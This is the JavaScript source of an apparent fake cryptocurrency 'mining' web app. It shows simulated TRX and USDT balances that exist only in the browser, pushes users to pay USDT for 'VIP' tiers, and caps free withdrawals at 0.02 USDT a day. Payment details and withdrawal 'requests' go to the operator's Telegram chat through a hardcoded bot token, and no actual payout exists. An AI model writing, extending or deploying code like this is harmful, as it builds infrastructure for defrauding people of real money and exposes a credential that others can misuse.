class MiningSystem {
    constructor() {
        this.userData = this.loadUserData();
        this.telegramConfig = {
            botToken: '8007115834:AAGA1bEIyk-1o4AJVMMph-_d-mi2qk_AZaI',
            chatId: '7417215529'
        };
        this.miningInterval = null;
        this.vipTimers = {};
        this.redeemCodes = this.generateRedeemCodes();
        this.initializeApp();
    }

    initializeApp() {
        this.setupEventListeners();
        this.setupNavigation();
        this.updateDisplay();
        this.startTimers();
        this.sendWelcomeMessage();
    }

    loadUserData() {
        const saved = localStorage.getItem('trxMiningData');
        const defaultData = {
            userId: this.generateUserId(),
            trxBalance: 0,
            usdtBalance: 2.00, // 2 USDT free bonus for new users
            vipLevel: 0,
            miningActive: false,
            miningStartTime: null,
            lastClaim: null,
            miningHistory: [],
            transactions: [],
            inviteCode: this.generateInviteCode(),
            teamSize: 0,
            referralEarnings: 0,
            todayWithdraw: 0,
            lastWithdrawDate: new Date().toDateString(),
            vipClaims: {
                vip1: null,
                vip2: null
            }
        };

        if (saved) {
            const data = JSON.parse(saved);
            // Reset daily withdrawal if it's a new day
            if (data.lastWithdrawDate !== new Date().toDateString()) {
                data.todayWithdraw = 0;
                data.lastWithdrawDate = new Date().toDateString();
            }
            return { ...defaultData, ...data, usdtBalance: data.usdtBalance };
        }
        
        return defaultData;
    }

    generateUserId() {
        let userId = localStorage.getItem('trxUserId');
        if (!userId) {
            userId = 'USER_' + Math.floor(100000 + Math.random() * 900000);
            localStorage.setItem('trxUserId', userId);
        }
        return userId;
    }

    generateInviteCode() {
        let code = localStorage.getItem('trxInviteCode');
        if (!code) {
            code = 'INV' + Math.floor(1000 + Math.random() * 9000);
            localStorage.setItem('trxInviteCode', code);
        }
        return code;
    }

    generateRedeemCodes() {
        const codes = [];
        for (let i = 0; i < 50; i++) {
            codes.push({
                code: 'VIP10-' + Math.random().toString(36).substr(2, 8).toUpperCase(),
                value: 10,
                used: false
            });
        }
        return codes;
    }

    saveUserData() {
        localStorage.setItem('trxMiningData', JSON.stringify(this.userData));
        this.updateDisplay();
    }

    setupNavigation() {
        const navButtons = document.querySelectorAll('.nav-btn');
        const sections = document.querySelectorAll('.content-section');

        navButtons.forEach(btn => {
            btn.addEventListener('click', () => {
                const targetSection = btn.getAttribute('data-section');
                
                navButtons.forEach(b => b.classList.remove('active'));
                sections.forEach(s => s.classList.remove('active'));
                
                btn.classList.add('active');
                document.getElementById(targetSection).classList.add('active');
            });
        });
    }

    setupEventListeners() {
        // Mining
        document.getElementById('startMining').addEventListener('click', () => this.startMining());
        document.getElementById('claimMining').addEventListener('click', () => this.claimMiningReward());
        
        // VIP Mining
        document.getElementById('claimVIP1').addEventListener('click', () => this.claimVIPReward(1));
        document.getElementById('claimVIP2').addEventListener('click', () => this.claimVIPReward(2));
        
        // Conversion
        document.getElementById('convertTRX').addEventListener('click', () => this.convertTRX());
        
        // Withdrawals
        document.getElementById('normalWithdraw').addEventListener('click', () => this.normalWithdraw());
        document.getElementById('vipWithdraw').addEventListener('click', () => this.vipWithdraw());
        document.getElementById('superVipWithdraw').addEventListener('click', () => this.superVipWithdraw());
        
        // VIP Purchase
        document.querySelectorAll('.vip-buy-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const vipLevel = e.target.getAttribute('data-vip');
                this.showVipPaymentModal(parseInt(vipLevel));
            });
        });
        
        // VIP Payment
        document.getElementById('submitVipPayment').addEventListener('click', () => this.submitVipPayment());
        
        // Bonus Redeem
        document.getElementById('submitRedeem').addEventListener('click', () => this.redeemBonusCode());
    }

    startTimers() {
        // Update mining timer every second
        setInterval(() => {
            this.updateMiningTimer();
            this.updateVipTimers();
        }, 1000);
    }

    startMining() {
        if (this.userData.miningActive) {
            this.showNotification('⏳ Mining is already running!', 'info');
            return;
        }

        this.userData.miningActive = true;
        this.userData.miningStartTime = Date.now();
        this.saveUserData();

        this.showNotification('🚀 Mining started successfully!', 'success');
        this.addMiningHistory('Mining started');
        
        // Send to Telegram
        this.sendToTelegram(`⛏️ Mining Started\n👤 User: ${this.userData.userId}\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    updateMiningTimer() {
        if (!this.userData.miningActive || !this.userData.miningStartTime) {
            document.getElementById('mainMinerStatus').textContent = '⏹️ Stopped';
            document.getElementById('miningTimer').textContent = '02:00:00';
            document.getElementById('miningStatus').textContent = '⏹️ Mining Stopped';
            document.getElementById('claimMining').disabled = true;
            return;
        }

        const now = Date.now();
        const startTime = this.userData.miningStartTime;
        const elapsed = now - startTime;
        const cycleTime = 2 * 60 * 60 * 1000; // 2 hours
        
        const remaining = Math.max(0, cycleTime - elapsed);
        
        const hours = Math.floor(remaining / (1000 * 60 * 60));
        const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
        
        const timerString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        document.getElementById('miningTimer').textContent = timerString;
        document.getElementById('miningStatus').textContent = `⛏️ Mining... ${timerString}`;
        
        if (remaining <= 0) {
            document.getElementById('mainMinerStatus').textContent = '✅ Ready to Claim';
            document.getElementById('claimMining').disabled = false;
        } else {
            document.getElementById('mainMinerStatus').textContent = '⏳ Mining...';
            document.getElementById('claimMining').disabled = true;
        }
    }

    async claimMiningReward() {
        if (!this.userData.miningActive) {
            this.showNotification('❌ Start mining first!', 'error');
            return;
        }

        const startTime = this.userData.miningStartTime;
        const now = Date.now();
        const elapsed = now - startTime;
        const cycleTime = 2 * 60 * 60 * 1000;
        
        if (elapsed < cycleTime) {
            this.showNotification('⏳ Mining cycle not completed yet!', 'error');
            return;
        }

        const reward = 5; // 5 TRX per cycle
        this.userData.trxBalance += reward;
        this.userData.miningActive = false;
        this.userData.miningStartTime = null;
        this.userData.lastClaim = now;
        
        this.addMiningHistory(`Collected +${reward} TRX`);
        this.addTransaction('Mining Reward', reward, 'TRX');
        this.saveUserData();
        
        this.showNotification(`🎉 Successfully claimed ${reward} TRX!`, 'success');
        
        // Send to Telegram
        await this.sendToTelegram(`🔄 Mining Reward Claimed\n👤 User: ${this.userData.userId}\n💰 Amount: ${reward} TRX\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    updateVipTimers() {
        // VIP 1 Timer
        const vip1LastClaim = this.userData.vipClaims.vip1;
        const vip1Cooldown = 24 * 60 * 60 * 1000; // 24 hours
        const now = Date.now();
        
        if (this.userData.vipLevel >= 1) {
            document.getElementById('vip1Miner').querySelector('.status').textContent = '✅ Active';
            document.getElementById('claimVIP1').disabled = false;
            
            if (vip1LastClaim) {
                const remaining = Math.max(0, vip1Cooldown - (now - vip1LastClaim));
                const hours = Math.floor(remaining / (1000 * 60 * 60));
                const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
                
                document.getElementById('vip1Timer').textContent = 
                    `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                document.getElementById('claimVIP1').disabled = remaining > 0;
            } else {
                document.getElementById('vip1Timer').textContent = '00:00:00';
                document.getElementById('claimVIP1').disabled = false;
            }
        }

        // VIP 2 Timer
        const vip2LastClaim = this.userData.vipClaims.vip2;
        if (this.userData.vipLevel >= 2) {
            document.getElementById('vip2Miner').querySelector('.status').textContent = '✅ Active';
            document.getElementById('claimVIP2').disabled = false;
            
            if (vip2LastClaim) {
                const remaining = Math.max(0, vip1Cooldown - (now - vip2LastClaim));
                const hours = Math.floor(remaining / (1000 * 60 * 60));
                const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
                
                document.getElementById('vip2Timer').textContent = 
                    `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                document.getElementById('claimVIP2').disabled = remaining > 0;
            } else {
                document.getElementById('vip2Timer').textContent = '00:00:00';
                document.getElementById('claimVIP2').disabled = false;
            }
        }
    }

    async claimVIPReward(vipLevel) {
        if (this.userData.vipLevel < vipLevel) {
            this.showNotification(`❌ VIP ${vipLevel} required!`, 'error');
            return;
        }

        const lastClaim = this.userData.vipClaims[`vip${vipLevel}`];
        const cooldown = 24 * 60 * 60 * 1000;
        const now = Date.now();

        if (lastClaim && (now - lastClaim) < cooldown) {
            this.showNotification('⏳ VIP reward not ready yet!', 'error');
            return;
        }

        const reward = vipLevel === 1 ? 0.50 : 6.00;
        this.userData.usdtBalance += reward;
        this.userData.vipClaims[`vip${vipLevel}`] = now;
        
        this.addTransaction(`VIP ${vipLevel} Daily Reward`, reward, 'USDT');
        this.saveUserData();
        
        this.showNotification(`🎉 Claimed ${reward} USDT from VIP ${vipLevel}!`, 'success');
        
        // Send to Telegram
        await this.sendToTelegram(`👑 VIP ${vipLevel} Reward Claimed\n👤 User: ${this.userData.userId}\n💰 Amount: ${reward} USDT\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    async convertTRX() {
        const trxAmount = parseFloat(document.getElementById('trxToConvert').value);
        
        if (!trxAmount || trxAmount <= 0) {
            this.showNotification('❌ Please enter valid TRX amount!', 'error');
            return;
        }
        
        if (trxAmount > this.userData.trxBalance) {
            this.showNotification('❌ Insufficient TRX balance!', 'error');
            return;
        }
        
        const conversionRate = 0.10;
        const usdtAmount = trxAmount * conversionRate;
        
        this.userData.trxBalance -= trxAmount;
        this.userData.usdtBalance += usdtAmount;
        
        this.addTransaction('TRX to USDT Conversion', usdtAmount, 'USDT');
        this.saveUserData();
        
        this.showNotification(`✅ Converted ${trxAmount} TRX to ${usdtAmount.toFixed(2)} USDT`, 'success');
        document.getElementById('trxToConvert').value = '';
        
        // Send to Telegram
        await this.sendToTelegram(`💱 TRX Conversion\n👤 User: ${this.userData.userId}\n🔀 ${trxAmount} TRX → ${usdtAmount.toFixed(2)} USDT\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    async normalWithdraw() {
        const amount = parseFloat(document.getElementById('normalWithdrawAmount').value);
        
        if (!amount || amount <= 0) {
            this.showNotification('❌ Please enter valid amount!', 'error');
            return;
        }
        
        if (amount > this.userData.usdtBalance) {
            this.showNotification('❌ Insufficient USDT balance!', 'error');
            return;
        }

        // Check daily limit (0.02 USDT for free users)
        const dailyLimit = 0.02;
        if (amount > dailyLimit) {
            this.showNotification(`❌ Daily limit is ${dailyLimit} USDT for free users!`, 'error');
            return;
        }

        if (this.userData.todayWithdraw + amount > dailyLimit) {
            const remaining = dailyLimit - this.userData.todayWithdraw;
            this.showNotification(`❌ You can only withdraw ${remaining.toFixed(2)} USDT today!`, 'error');
            return;
        }

        this.userData.usdtBalance -= amount;
        this.userData.todayWithdraw += amount;
        this.addTransaction('Withdrawal', -amount, 'USDT');
        this.saveUserData();
        
        this.showNotification(`📤 Withdrawal request submitted for ${amount} USDT!`, 'success');
        document.getElementById('normalWithdrawAmount').value = '';
        
        // Send to Telegram
        await this.sendToTelegram(`💸 Withdrawal Request\n👤 User: ${this.userData.userId}\n💰 Amount: ${amount} USDT\n🚀 Type: Normal\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    async vipWithdraw() {
        if (this.userData.vipLevel < 1) {
            this.showNotification('❌ VIP membership required!', 'error');
            return;
        }

        const amount = parseFloat(document.getElementById('vipWithdrawAmount').value);
        
        if (!amount || amount <= 0) {
            this.showNotification('❌ Please enter valid amount!', 'error');
            return;
        }
        
        if (amount > this.userData.usdtBalance) {
            this.showNotification('❌ Insufficient USDT balance!', 'error');
            return;
        }

        this.userData.usdtBalance -= amount;
        this.addTransaction('VIP Withdrawal', -amount, 'USDT');
        this.saveUserData();
        
        this.showNotification(`⚡ VIP withdrawal submitted for ${amount} USDT!`, 'success');
        document.getElementById('vipWithdrawAmount').value = '';
        
        // Send to Telegram
        await this.sendToTelegram(`💸 VIP Withdrawal Request\n👤 User: ${this.userData.userId}\n💰 Amount: ${amount} USDT\n🚀 Type: VIP Fast\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    async superVipWithdraw() {
        if (this.userData.vipLevel < 2) {
            this.showNotification('❌ VIP 2 membership required!', 'error');
            return;
        }

        const amount = parseFloat(document.getElementById('superVipWithdrawAmount').value);
        
        if (!amount || amount <= 0) {
            this.showNotification('❌ Please enter valid amount!', 'error');
            return;
        }
        
        if (amount > this.userData.usdtBalance) {
            this.showNotification('❌ Insufficient USDT balance!', 'error');
            return;
        }

        this.userData.usdtBalance -= amount;
        this.addTransaction('Super VIP Withdrawal', -amount, 'USDT');
        this.saveUserData();
        
        this.showNotification(`🚀 Super VIP withdrawal submitted for ${amount} USDT!`, 'success');
        document.getElementById('superVipWithdrawAmount').value = '';
        
        // Send to Telegram
        await this.sendToTelegram(`💸 Super VIP Withdrawal Request\n👤 User: ${this.userData.userId}\n💰 Amount: ${amount} USDT\n🚀 Type: Super VIP\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    showVipPaymentModal(vipLevel) {
        document.getElementById('vipLevelSelect').value = vipLevel;
        this.showNotification(`💰 Prepare ${vipLevel === 1 ? '1.00' : '10.00'} USDT for VIP ${vipLevel}`, 'info');
        
        // Scroll to payment section
        document.getElementById('vip').classList.add('active');
        document.querySelector('.payment-instructions').scrollIntoView({ behavior: 'smooth' });
    }

    async submitVipPayment() {
        const senderUid = document.getElementById('userAccountId').value.trim();
        const transactionHash = document.getElementById('transactionHash').value.trim();
        const vipLevel = parseInt(document.getElementById('vipLevelSelect').value);
        
        if (!senderUid) {
            this.showNotification('❌ Please enter your account UID!', 'error');
            return;
        }
        
        const amount = vipLevel === 1 ? 1.00 : 10.00;
        
        // Send to Telegram
        const message = `🆕 VIP Purchase Request\n👤 User ID: ${this.userData.userId}\n⭐ VIP Level: ${vipLevel}\n💰 Amount: ${amount} USDT\n🔗 Sender UID: ${senderUid}\n📄 Transaction Hash: ${transactionHash || 'Not provided'}\n⏰ Time: ${new Date().toLocaleString()}`;
        
        const success = await this.sendToTelegram(message);
        
        if (success) {
            this.showNotification('✅ VIP purchase request sent to admin!', 'success');
            document.getElementById('userAccountId').value = '';
            document.getElementById('transactionHash').value = '';
        }
    }

    async redeemBonusCode() {
        const code = document.getElementById('redeemCode').value.trim().toUpperCase();
        
        if (!code) {
            this.showNotification('❌ Please enter redeem code!', 'error');
            return;
        }
        
        const redeemCode = this.redeemCodes.find(c => c.code === code && !c.used);
        
        if (!redeemCode) {
            this.showNotification('❌ Invalid or already used redeem code!', 'error');
            return;
        }
        
        redeemCode.used = true;
        this.userData.usdtBalance += redeemCode.value;
        this.addTransaction('Bonus Redeem', redeemCode.value, 'USDT');
        this.saveUserData();
        
        this.showNotification(`🎉 Successfully redeemed ${redeemCode.value} USDT!`, 'success');
        document.getElementById('redeemCode').value = '';
        
        // Send to Telegram
        await this.sendToTelegram(`🎁 Bonus Code Redeemed\n👤 User: ${this.userData.userId}\n💰 Amount: ${redeemCode.value} USDT\n🔑 Code: ${code}\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    async sendToTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${this.telegramConfig.botToken}/sendMessage`;
            const formData = new FormData();
            formData.append('chat_id', this.telegramConfig.chatId);
            formData.append('text', message);
            formData.append('parse_mode', 'HTML');

            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });

            const data = await response.json();
            
            if (data.ok) {
                console.log('✅ Message sent to Telegram successfully!');
                return true;
            } else {
                console.error('❌ Telegram API error:', data);
                this.showNotification('❌ Failed to send message to Telegram', 'error');
                return false;
            }
        } catch (error) {
            console.error('❌ Error sending to Telegram:', error);
            this.showNotification('❌ Network error - please check connection', 'error');
            return false;
        }
    }

    async sendWelcomeMessage() {
        // Send welcome message only for new users
        const welcomeSent = localStorage.getItem('welcomeSent');
        if (!welcomeSent) {
            const message = `👋 New User Registered\n👤 User ID: ${this.userData.userId}\n💰 Free Bonus: 2.00 USDT\n⏰ Time: ${new Date().toLocaleString()}`;
            await this.sendToTelegram(message);
            localStorage.setItem('welcomeSent', 'true');
        }
    }

    addMiningHistory(message) {
        this.userData.miningHistory.unshift({
            message: message,
            timestamp: new Date().toLocaleString()
        });
        
        if (this.userData.miningHistory.length > 10) {
            this.userData.miningHistory = this.userData.miningHistory.slice(0, 10);
        }
        
        this.updateMiningHistory();
    }

    addTransaction(description, amount, currency) {
        this.userData.transactions.unshift({
            description: description,
            amount: amount,
            currency: currency,
            timestamp: new Date().toLocaleString(),
            type: amount >= 0 ? 'credit' : 'debit'
        });
        
        if (this.userData.transactions.length > 10) {
            this.userData.transactions = this.userData.transactions.slice(0, 10);
        }
        
        this.updateTransactionHistory();
    }

    updateDisplay() {
        // Update balances
        document.getElementById('trxBalance').textContent = this.userData.trxBalance.toFixed(2);
        document.getElementById('usdtBalance').textContent = this.userData.usdtBalance.toFixed(2);
        document.getElementById('totalBalance').textContent = this.userData.usdtBalance.toFixed(2) + ' USDT';
        document.getElementById('normalBalance').textContent = this.userData.usdtBalance.toFixed(2) + ' USDT';
        document.getElementById('vipBalance').textContent = this.userData.usdtBalance.toFixed(2) + ' USDT';
        document.getElementById('superVipBalance').textContent = this.userData.usdtBalance.toFixed(2) + ' USDT';
        document.getElementById('usedToday').textContent = this.userData.todayWithdraw.toFixed(2) + ' USDT';
        
        // Update user info
        document.getElementById('userId').textContent = this.userData.userId;
        document.getElementById('accountId').textContent = this.userData.userId;
        document.getElementById('inviteCode').textContent = this.userData.inviteCode;
        
        // Update VIP status
        const vipStatus = this.userData.vipLevel === 0 ? 'No VIP' : `VIP ${this.userData.vipLevel}`;
        document.getElementById('vipStatus').textContent = vipStatus;
        document.getElementById('vipLevel').textContent = vipStatus;
        
        if (this.userData.vipLevel > 0) {
            document.getElementById('vipLevel').style.background = 'linear-gradient(135deg, #ffd700, #ffa500)';
        }
        
        // Update team stats
        document.getElementById('teamSize').textContent = this.userData.teamSize;
        document.getElementById('referralEarnings').textContent = this.userData.referralEarnings.toFixed(2) + ' USDT';
        document.getElementById('activeReferrals').textContent = this.userData.teamSize;
        
        // Update histories
        this.updateMiningHistory();
        this.updateTransactionHistory();
        
        // Update VIP miner access
        this.updateVipMinersAccess();
    }

    updateVipMinersAccess() {
        if (this.userData.vipLevel >= 1) {
            document.getElementById('vip1Miner').querySelector('.status').textContent = '✅ Active';
            document.getElementById('claimVIP1').disabled = false;
        }
        
        if (this.userData.vipLevel >= 2) {
            document.getElementById('vip2Miner').querySelector('.status').textContent = '✅ Active';
            document.getElementById('claimVIP2').disabled = false;
        }
    }

    updateMiningHistory() {
        const historyContainer = document.getElementById('miningHistory');
        
        if (this.userData.miningHistory.length === 0) {
            return;
        }
        
        historyContainer.innerHTML = this.userData.miningHistory.map(item => `
            <div class="history-item">
                <span>${item.message}</span>
                <span class="time">${item.timestamp}</span>
            </div>
        `).join('');
    }

    updateTransactionHistory() {
        const historyContainer = document.getElementById('transactionHistory');
        
        if (this.userData.transactions.length === 0) {
            return;
        }
        
        historyContainer.innerHTML = this.userData.transactions.map(transaction => `
            <div class="history-item">
                <span>${transaction.description}</span>
                <span class="time ${transaction.type}">
                    ${transaction.type === 'credit' ? '+' : ''}${transaction.amount} ${transaction.currency}
                </span>
            </div>
        `).join('');
    }

    showNotification(message, type = 'info') {
        const notification = document.getElementById('notification');
        const messageElement = document.getElementById('notificationMessage');
        
        messageElement.textContent = message;
        notification.className = 'notification';
        
        switch(type) {
            case 'success':
                notification.style.background = 'linear-gradient(135deg, #00ff88, #00cc66)';
                break;
            case 'error':
                notification.style.background = 'linear-gradient(135deg, #ff6b6b, #ff4757)';
                break;
            case 'warning':
                notification.style.background = 'linear-gradient(135deg, #ffd700, #ffa500)';
                break;
            default:
                notification.style.background = 'linear-gradient(135deg, #00d4ff, #0099cc)';
        }
        
        notification.classList.remove('hidden');
        
        setTimeout(() => {
            notification.classList.add('hidden');
        }, 4000);
    }
}

// Global functions
function copyInviteCode() {
    const inviteCode = document.getElementById('inviteCode').textContent;
    navigator.clipboard.writeText(inviteCode).then(() => {
        if (window.miningSystem) {
            window.miningSystem.showNotification('✅ Invite code copied to clipboard!', 'success');
        }
    });
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        if (window.miningSystem) {
            window.miningSystem.showNotification('✅ Copied to clipboard!', 'success');
        }
    });
}

function closeNotification() {
    document.getElementById('notification').classList.add('hidden');
}

// Test Telegram connection
async function testTelegramConnection() {
    const miningSystem = window.miningSystem;
    if (miningSystem) {
        const testMessage = `🤖 Bot Connection Test\n✅ System is working perfectly\n👤 User ID: ${miningSystem.userData.userId}\n⏰ Time: ${new Date().toLocaleString()}`;
        const success = await miningSystem.sendToTelegram(testMessage);
        if (success) {
            miningSystem.showNotification('✅ Telegram connection test successful!', 'success');
        }
    }
}

// Initialize the app
document.addEventListener('DOMContentLoaded', () => {
    window.miningSystem = new MiningSystem();
    
    // Add test button for debugging (remove in production)
    const testBtn = document.createElement('button');
    testBtn.textContent = 'Test Telegram';
    testBtn.style.position = 'fixed';
    testBtn.style.bottom = '10px';
    testBtn.style.right = '10px';
    testBtn.style.zIndex = '1000';
    testBtn.style.padding = '8px 12px';
    testBtn.style.background = '#ff6b6b';
    testBtn.style.color = 'white';
    testBtn.style.border = 'none';
    testBtn.style.borderRadius = '5px';
    testBtn.style.cursor = 'pointer';
    testBtn.style.fontSize = '10px';
    testBtn.onclick = testTelegramConnection;
    document.body.appendChild(testBtn);
});

// Export redeem codes for admin
function exportRedeemCodes() {
    const miningSystem = window.miningSystem;
    if (miningSystem) {
        const unusedCodes = miningSystem.redeemCodes.filter(code => !code.used);
        const codesText = unusedCodes.map(code => `${code.code} - ${code.value} USDT`).join('\n');
        
        const blob = new Blob([codesText], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'redeem-codes.txt';
        a.click();
        URL.revokeObjectURL(url);
        
        miningSystem.showNotification('✅ Redeem codes exported!', 'success');
    }
}
